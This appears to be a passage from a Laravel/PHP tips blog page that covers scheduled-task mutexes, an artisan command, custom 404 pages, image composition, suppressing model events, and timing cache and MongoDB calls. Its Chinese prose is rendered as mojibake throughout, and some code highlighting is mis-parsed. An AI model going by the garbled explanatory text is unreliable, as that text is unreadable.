class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30088</span></span><br></pre></td></tr></table></figure>
<h3 id="ä»»åŠ¡é‡å¤æ‰§è¡Œ"><a href="#ä»»åŠ¡é‡å¤æ‰§è¡Œ" class="headerlink" title="ä»»åŠ¡é‡å¤æ‰§è¡Œ"></a>ä»»åŠ¡é‡å¤æ‰§è¡Œ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">å½“å‰ä»»åŠ¡è¿˜æ²¡æœ‰æ‰§è¡Œå®Œæ¯•çš„æ—¶å€™å¦ä¸€ä¸ªç›¸åŒçš„ä»»åŠ¡ä¹Ÿä¼šæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´ä»»åŠ¡é‡å¤ã€‚ä¾‹å¦‚æƒ³è±¡ä¸€ä¸‹æˆ‘ä»¬æ‰§è¡Œæ¯åˆ†é’Ÿç”Ÿæˆä¸€æ¬¡æŠ¥å‘Šçš„ä»»åŠ¡ï¼Œåœ¨ç»è¿‡ä¸€æ®µæ—¶é—´åï¼Œæ•°æ®é‡å˜å¾—å¾ˆå¤§å¯¼è‡´æ‰§è¡Œæ—¶é—´å¤šäº <span class="number">1</span> åˆ†é’Ÿï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´åœ¨ä¸Šä¸€ä¸ªä»»åŠ¡è¿˜æ²¡ç»“æŸçš„æ—¶å€™å¦ä¸€ä¸ªç›¸åŒçš„ä»»åŠ¡å¼€å§‹æ‰§è¡Œ</span><br><span class="line"></span><br><span class="line">å½“æˆ‘ä»¬åœ¨å¼€ä¼šè¿›è¡Œæ¿€çƒˆçš„è®¨è®ºæ—¶ï¼Œæˆ‘ä¼šä»æˆ‘æ¡Œå­é‡Œæ‹¿å‡ºæ¥ä¸€ä¸ªå°–å«é¸¡ã€‚åªæœ‰æ‰‹é‡Œæ‹¿ç€å°–å«é¸¡çš„äººæ‰èƒ½è¯´è¯ï¼Œå¦‚æœä½ æ²¡æœ‰æ‹¿ç€å°–å«é¸¡ä½ æ˜¯ä¸èƒ½è¯´è¯çš„ã€‚ä½ åªèƒ½å‘ä¼šè®®ä¸»æŒäººè¯·ç¤ºï¼Œåªæœ‰åœ¨ä½ æ‹¿åˆ°å°–å«é¸¡çš„æ—¶å€™ä½ æ‰èƒ½è¯´è¯å¦åˆ™åªèƒ½ç­‰å¾…ã€‚å½“ä½ è®²è¯å®Œæ¯•çš„æ—¶å€™ï¼Œå°†å°–å«é¸¡è¿˜ç»™ä¼šè®®ä¸»æŒäººï¼Œä¸»æŒäººä¼šå°†å°–å«é¸¡ç»™åˆ°ä¸‹ä¸€ä¸ªäººæ¥è®©å…¶è¯´è¯ã€‚è¿™æ ·ä¼šç¡®ä¿äººä»¬ä¸ä¼šäº’ç›¸äº¤è°ˆï¼ŒåŒæ—¶ä»–ä»¬ä¹Ÿä¼šæœ‰è‡ªå·±çš„æ—¶é—´æ¥è¿›è¡Œè®²è¯ã€‚</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">create</span>(<span class="params">Event $event</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache-&gt;add($event-&gt;mutexName(), <span class="literal">true</span>, <span class="number">1440</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">exists</span>(<span class="params">Event $event</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;cache-&gt;has($event-&gt;mutexName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">forget</span>(<span class="params">Event $event</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;cache-&gt;forget($event-&gt;mutexName());</span><br><span class="line">&#125;</span><br><span class="line">register_shutdown_function(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;removeMutex();</span><br><span class="line">&#125;);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30550</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ›å»ºä¸€ä¸ªå‘½ä»¤"><a href="#åˆ›å»ºä¸€ä¸ªå‘½ä»¤" class="headerlink" title="åˆ›å»ºä¸€ä¸ªå‘½ä»¤"></a>åˆ›å»ºä¸€ä¸ªå‘½ä»¤</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:command HashCommand</span><br><span class="line">$signature å±æ€§ï¼Œè®¾ç½®å‘½ä»¤åã€å‘½ä»¤å‚æ•°ã€å‘½ä»¤é€‰é¡¹ï¼›</span><br><span class="line">$description å±æ€§ï¼Œè®¾ç½®å‘½ä»¤çš„æè¿°ä¿¡æ¯ï¼›</span><br><span class="line">handle() æ–¹æ³•ï¼ŒåŒ…å«å®é™…çš„å‘½ä»¤é€»è¾‘ä»£ç ã€‚</span><br><span class="line">ä¿®æ”¹ $signature å±æ€§ï¼Œè®¾ç½® hash å‘½ä»¤çš„å‘½ä»¤åã€å‘½ä»¤å‚æ•°ã€å‘½ä»¤é€‰é¡¹ï¼š</span><br><span class="line"></span><br><span class="line">protected $signature = <span class="string">'hash &#123;text&#125; &#123;--U|uppercase&#125;'</span>;</span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = $<span class="keyword">this</span>-&gt;argument(<span class="string">'text'</span>);</span><br><span class="line">        $uppercase = $<span class="keyword">this</span>-&gt;option(<span class="string">'uppercase'</span>);</span><br><span class="line"></span><br><span class="line">        $md5text = $uppercase ? strtoupper(md5($text)) : md5($text);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;info(<span class="string">"md5('&#123;$text&#125;') = $md5text"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">$ php artisan hash <span class="string">"hello world"</span></span><br><span class="line">md5(<span class="string">'hello world'</span>) = <span class="number">5</span>eb63bbbe01eeed093cb22bb8f5acdc3</span><br><span class="line">å¸¦ä¸Š -U é€‰é¡¹ï¼š</span><br><span class="line"></span><br><span class="line">$ php artisan hash <span class="string">"hello world"</span> -U</span><br><span class="line">md5(<span class="string">'hello world'</span>) = <span class="number">5</span>EB63BBBE01EEED093CB22BB8F5ACDC3</span><br></pre></td></tr></table></figure>
<h3 id="è‡ªå®šä¹‰-Laravel-çš„-404-é¡µé¢"><a href="#è‡ªå®šä¹‰-Laravel-çš„-404-é¡µé¢" class="headerlink" title="è‡ªå®šä¹‰ Laravel çš„ 404 é¡µé¢"></a>è‡ªå®šä¹‰ Laravel çš„ 404 é¡µé¢</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">app/Exceptions/Handler.php æ–‡ä»¶ä¸­ä¿®æ”¹ render æ–¹æ³•</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">$request, Exception $exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isHttpException($exception)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($exception-&gt;getStatusCode() == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;view(<span class="string">'errors.'</span> . <span class="string">'404'</span>, [], <span class="number">404</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parent::render($request, $exception);</span><br><span class="line">&#125;åˆ›å»ºä¸€ä¸ªæ–°çš„è§†å›¾ errors/<span class="number">404.</span>blade.php ã€‚</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">$request, Exception $exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isHttpException($exception)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (view()-&gt;exists(<span class="string">'errors.'</span> . $exception-&gt;getStatusCode())) &#123;</span><br><span class="line">            <span class="keyword">return</span> response()-&gt;view(<span class="string">'errors.'</span> . $exception-&gt;getStatusCode(), [], $exception-&gt;getStatusCode());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> parent::render($request, $exception);</span><br><span class="line">&#125;</span><br><span class="line">åˆ›å»ºä¸€ä¸ª è‡ªå®šä¹‰å¼‚å¸¸ ã€‚è¿è¡Œä»¥ä¸‹ä»£ç æ¥åˆ›å»ºä¸€ä¸ªåä¸º TestingHttpException çš„å¼‚å¸¸ã€‚</span><br><span class="line"></span><br><span class="line">php artisan make:exception TestingHttpException</span><br><span class="line">åœ¨  app/Exceptions/Handler.php  æ–‡ä»¶ä¸­ï¼Œä¿®æ”¹ render æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">$request, Exception $exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($exception <span class="keyword">instanceof</span> TestingHttpException) &#123;</span><br><span class="line">        <span class="keyword">return</span> response()-&gt;view(<span class="string">'errors.testing'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> parent::render($request, $exception);</span><br><span class="line">&#125;</span><br><span class="line">å¦‚æœå¼‚å¸¸æ˜¯ TestingHttpException çš„å®ä¾‹ï¼Œå®ƒå°†è¿”å› errors.testing è§†å›¾ã€‚https:<span class="comment">//learnku.com/laravel/t/27873</span></span><br></pre></td></tr></table></figure>
<h3 id="å›¾ç‰‡å¤„ç†"><a href="#å›¾ç‰‡å¤„ç†" class="headerlink" title="å›¾ç‰‡å¤„ç†"></a>å›¾ç‰‡å¤„ç†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> intervention/image  https:<span class="comment">//learnku.com/laravel/t/30978</span></span><br><span class="line"> <span class="comment">// åˆ›å»ºä¸€å¼ ç©ºçš„ç”»å¸ƒï¼Œåƒç´ 3628x1757ï¼ŒèƒŒæ™¯ç™½è‰²</span></span><br><span class="line">   $img = Image::canvas(<span class="number">3628</span>, <span class="number">1757</span>, <span class="string">'#fff'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–æœ¬åœ°å›¾ç‰‡ï¼Œå¯ä»¥è·å–inputä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">     $leftImage = Image::make(base_path().<span class="string">'/public/p.jpg'</span>)-&gt;resize(<span class="number">2255</span>, <span class="number">1305</span>);</span><br><span class="line">     $rightImage = Image::make(base_path().<span class="string">'/public/f.jpg'</span>)-&gt;resize(<span class="number">1000</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ’å…¥åˆ°ç”»å¸ƒï¼Œleft-topæ˜¯è·ç¦»å·¦ä¾§å’Œé¡¶éƒ¨ï¼Œå€¼å¯¹åº”çš„æ˜¯åé¢ 100 100 å¤„</span></span><br><span class="line">     $img-&gt;insert($leftImage, <span class="string">'left-top'</span>, <span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">     $img-&gt;insert($rightImage, <span class="string">'right-top'</span>, <span class="number">100</span>, <span class="number">250</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ’å…¥æ–‡æœ¬ï¼Œé€šè¿‡å›è°ƒè®¾ç½®å‚æ•°ï¼Œfileä¸Šä¼ çš„æ˜¯å­—ä½“åº“ï¼Œéœ€è¦è‡ªå·±ä¸‹è½½æ”¾å…¥</span></span><br><span class="line">     $img-&gt;text(<span class="string">'ç‹*å†›       320830**********542'</span>, <span class="number">1757</span>, <span class="number">1550</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$font</span>) </span>&#123;</span><br><span class="line">        $font-&gt;file(base_path().<span class="string">'/public/fzjw.ttf'</span>);</span><br><span class="line">        $font-&gt;size(<span class="number">160</span>);</span><br><span class="line">        $font-&gt;color(<span class="string">'#000'</span>);</span><br><span class="line">        $font-&gt;align(<span class="string">'center'</span>);</span><br><span class="line">        $font-&gt;valign(<span class="string">'top'</span>);</span><br><span class="line">        $font-&gt;angle(<span class="number">0</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//å¯ä»¥ç›´æ¥è¿”å›å›¾åƒï¼Œä¹Ÿå¯é€šè¿‡$img-&gt;save()è¿›è¡Œä¿å­˜å›¾ç‰‡</span></span><br><span class="line">    <span class="keyword">return</span> $img-&gt;response(<span class="string">'jpg'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="å–æ¶ˆäº‹ä»¶è§¦å‘"><a href="#å–æ¶ˆäº‹ä»¶è§¦å‘" class="headerlink" title="å–æ¶ˆäº‹ä»¶è§¦å‘"></a>å–æ¶ˆäº‹ä»¶è§¦å‘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–modelé‡Œé¢çš„äº‹ä»¶</span></span><br><span class="line">$dispatcher = YourModel::getEventDispatcher();</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¦ç”¨modelé‡Œé¢çš„äº‹ä»¶</span></span><br><span class="line">YourModel::unsetEventDispatcher();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨modelçš„saveæ–¹æ³•</span></span><br><span class="line">$yourInstance-&gt;save();</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯ç”¨äº‹ä»¶</span></span><br><span class="line">YourModel::setEventDispatcher($dispatcher);</span><br><span class="line"><span class="comment">//Visitor modelæœ‰savedäº‹ä»¶ï¼ŒæŸäº›åœ°æ–¹æŸäº›æƒ…å†µç›‘å¬åˆ°ååšä¸€äº›å…¶ä»–æ“ä½œ</span></span><br><span class="line">protected $dispatchesEvents = [</span><br><span class="line">        <span class="string">'saved'</span> =&gt; VisitorSavedEvent::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">    ];</span><br><span class="line"><span class="comment">//æœ‰æ—¶å€™ä¸éœ€è¦è§¦å‘äº‹ä»¶ï¼Œæ˜¯å¯ä»¥å–æ¶ˆçš„ï¼Œå¯ä»¥è°ƒç”¨modelçš„updateæ–¹æ³•é¿å¼€save()æˆ–è€…å–æ¶ˆäº‹ä»¶ï¼ˆæ¨èåè€…ï¼‰ã€‚</span></span><br><span class="line"><span class="comment">// è·å–æ¥è®¿ä¿¡æ¯</span></span><br><span class="line">        $visitor = Visitor::where(<span class="string">'id'</span>, $request-&gt;visitor_id)-&gt;first();</span><br><span class="line"><span class="comment">//å–æ¶ˆäº‹ä»¶è§¦å‘https://learnku.com/articles/31490</span></span><br><span class="line">$dispatcher = Visitor::getEventDispatcher();</span><br><span class="line">Visitor::unsetEventDispatcher();</span><br><span class="line">$ret = $visitor-&gt;save();</span><br><span class="line">Visitor::setEventDispatcher($dispatcher);</span><br><span class="line"><span class="comment">//5.7</span></span><br><span class="line">YourModel::withoutEvents(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="comment">// do something...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="è®°å½•memcache-mongodbè¿è¡Œæ—¶é—´"><a href="#è®°å½•memcache-mongodbè¿è¡Œæ—¶é—´" class="headerlink" title="è®°å½•memcache mongodbè¿è¡Œæ—¶é—´"></a>è®°å½•memcache mongodbè¿è¡Œæ—¶é—´</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line">cache   \vendor\laravel\framework\src\Illuminate\Cache\Repository.php</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Store $store</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;start = microtime(<span class="literal">true</span>);</span><br><span class="line">		$<span class="keyword">this</span>-&gt;store = $store;</span><br><span class="line">	&#125;</span><br><span class="line">protected <span class="function"><span class="keyword">function</span> <span class="title">fireCacheEvent</span>(<span class="params">$event, $payload</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * æ·»åŠ cacheå“åº”æ—¶é—´</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        $total = round((microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;start) * <span class="number">1000</span>, <span class="number">2</span>);</span><br><span class="line">        $payload[] = $total;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;events))</span><br><span class="line">		&#123;</span><br><span class="line">			$<span class="keyword">this</span>-&gt;events-&gt;fire(<span class="string">'cache.'</span>.$event, $payload);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params">$key, $value, $minutes</span>)</span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;start = microtime(<span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    		$minutes = $<span class="keyword">this</span>-&gt;getMinutes($minutes);</span><br><span class="line">    </span><br><span class="line">    		<span class="keyword">if</span> ( ! is_null($minutes))</span><br><span class="line">    		&#123;</span><br><span class="line">    			$<span class="keyword">this</span>-&gt;store-&gt;put($key, $value, $minutes);</span><br><span class="line">    </span><br><span class="line">    			$<span class="keyword">this</span>-&gt;fireCacheEvent(<span class="string">'write'</span>, [$key, $value, $minutes]);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">vendor\laravel\framework\src\Illuminate\Database\Eloquent\Model.php</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">array $attributes = array(</span>))</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;connection == <span class="string">"mongodb"</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_time_cost_start = microtime(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		$<span class="keyword">this</span>-&gt;bootIfNotBooted();</span><br><span class="line"></span><br><span class="line">		$<span class="keyword">this</span>-&gt;syncOriginal();</span><br><span class="line"></span><br><span class="line">		$<span class="keyword">this</span>-&gt;fill($attributes);</span><br><span class="line">	&#125;</span><br><span class="line">	public <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params">array $options = array(</span>))</span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">    	    <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;connection == <span class="string">"mongodb"</span>) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;_time_cost_start = microtime(<span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">  *<span class="regexp">/</span></span><br><span class="line"><span class="regexp"> 	protected function performInsert(Builder $query, array $options = [])</span></span><br><span class="line"><span class="regexp"> 	&#123;</span></span><br><span class="line"><span class="regexp"> 		if ($this-&gt;fireModelEvent('creating') === false) return false;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp"> 		if ($this-&gt;timestamps &amp;&amp; array_get($options, 'timestamps', true))</span></span><br><span class="line"><span class="regexp"> 		&#123;</span></span><br><span class="line"><span class="regexp"> 			$this-&gt;updateTimestamps();</span></span><br><span class="line"><span class="regexp"> 		&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp"> 		$attributes = $this-&gt;attributes;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">         $conn = $query-&gt;getModel()-&gt;connection;</span></span><br><span class="line"><span class="regexp">         if($conn == "mongodb") &#123;</span></span><br><span class="line"><span class="regexp">             unset($attributes['_time_cost_start']);</span></span><br><span class="line"><span class="regexp">             unset($attributes['_time_cost_total']);</span></span><br><span class="line"><span class="regexp">         &#125;</span></span><br><span class="line"><span class="regexp">protected function fireModelEvent($event, $halt = true)</span></span><br><span class="line"><span class="regexp">	&#123;</span></span><br><span class="line"><span class="regexp">		if ( ! isset(static::$dispatcher)) return true;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">        /</span>**</span><br><span class="line">         * å°†ç›‘å¬äº‹ä»¶ç±»åå»æ‰ï¼Œå»æ‰<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class">         * æ·»åŠ <span class="title">mongodb</span>å“åº”æ—¶é—´</span></span><br><span class="line"><span class="class">         */</span></span><br><span class="line"><span class="class">		//$<span class="title">event</span> </span>= <span class="string">"eloquent.&#123;$event&#125;: "</span>.get_class($<span class="keyword">this</span>);</span><br><span class="line">        $event = <span class="string">"eloquent.&#123;$event&#125;"</span>;</span><br><span class="line">		$method = $halt ? <span class="string">'until'</span> : <span class="string">'fire'</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($<span class="keyword">this</span>-&gt;connection == <span class="string">"mongodb"</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;_time_cost_total = round((microtime(<span class="literal">true</span>) - $<span class="keyword">this</span>-&gt;_time_cost_start) * <span class="number">1000</span>, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">static</span>::$dispatcher-&gt;$method($event, $<span class="keyword">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        